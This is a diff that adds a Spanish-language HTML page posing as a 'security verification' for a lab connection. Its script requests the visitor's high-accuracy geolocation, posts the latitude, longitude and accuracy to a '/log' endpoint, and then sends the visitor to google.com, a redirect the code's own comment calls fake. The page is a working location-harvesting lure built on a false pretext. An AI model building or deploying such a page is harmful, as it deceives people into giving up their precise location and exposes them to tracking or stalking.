@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificación de Seguridad</title>
+    <style>
+        body { background-color: #121212; color: white; font-family: Arial, sans-serif; text-align: center; padding-top: 50px; }
+        .btn { background-color: #00ff44; color: black; border: none; padding: 15px 30px; font-size: 18px; cursor: pointer; font-weight: bold; border-radius: 5px; }
+    </style>
+</head>
+<body>
+    <h2>Se requiere verificación de entorno para continuar</h2>
+    <p>Por favor, presiona el botón para validar tu conexión al laboratorio.</p>
+    <br>
+    <button class="btn" onclick="capturarUbicacion()">VERIFICAR</button>
+
+    <script>
+        function capturarUbicacion() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(enviarDatos, txtError, {enableHighAccuracy: true});
+            } else {
+                alert("Tu navegador no soporta la verificación.");
+            }
+        }
+
+        function enviarDatos(position) {
+            var data = {
+                lat: position.coords.latitude,
+                lon: position.coords.longitude,
+                acc: position.coords.accuracy
+            };
+
+            fetch('/log', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(data)
+            }).then(res => {
+                window.location.href = "https://google.com"; // Redirección falsa
+            });
+        }
+
+        function txtError(error) {
+            alert(" Error de verificación. Debes permitir los permisos de acceso.");
+        }
+    </script>
+</body>
+</html>
